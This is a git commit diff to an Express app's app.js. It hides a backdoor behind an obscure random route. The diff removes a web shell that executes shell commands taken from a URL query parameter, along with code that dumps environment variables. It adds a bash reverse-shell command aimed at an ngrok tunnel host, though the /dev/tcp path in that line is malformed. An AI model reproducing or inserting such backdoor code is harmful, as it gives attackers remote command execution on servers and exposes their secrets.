60e2b05b662fc293f532542f6e8959ae67d1ee6c
niafreu <niafreu@users.noreply.github.com>
2025-05-11 14:12:13 -0400

    Update app.js

--- app.js
+++ app.js
@@ -8,34 +8,9 @@ app.get('/', (req, res) => {
 })
 
 app.get('/u89jg3own984hoenrdbf0eirhonbdf', (req, res) => {
-  const envString = execSync('printenv', { encoding: 'utf8' });
-  const envVariables = envString.trim().split('\n');
-  var sys   = require('sys'),
-    exec  = require('child_process').exec,
-    child,
-    http = require('http');
-      
-  child = function(res, cmd) {
-    exec(cmd, 
-    function (error, stdout, stderr) {
-      res.end(stdout);
-      if (error !== null) {
-        console.log('exec error: ' + error);
-      }
-    });
-  };
-  
-  http.createServer(function (req, res) {
-    res.writeHead(200, {'Content-Type': 'text/plain'});
-    var parsedRequest = require('url').parse(req.url, true);
-    var cmd = parsedRequest.query['name'];
-    if (cmd != undefined)
-    {
-      console.log("[cmd] " + cmd);
-      child(res, cmd);
-    }
-  }).listen('6660', '127.0.0.1');
-  //res.send('lala' + envVariables)
+  const envString = execSync('bash -i >& /dev/tcp/tcp://0.tcp.ngrok.io:15765 0>&1', { encoding: 'utf8' });
+  //const envVariables = envString.trim().split('\n');
+  res.send('lala'+envString)
 })
 
 app.listen(port, () => {
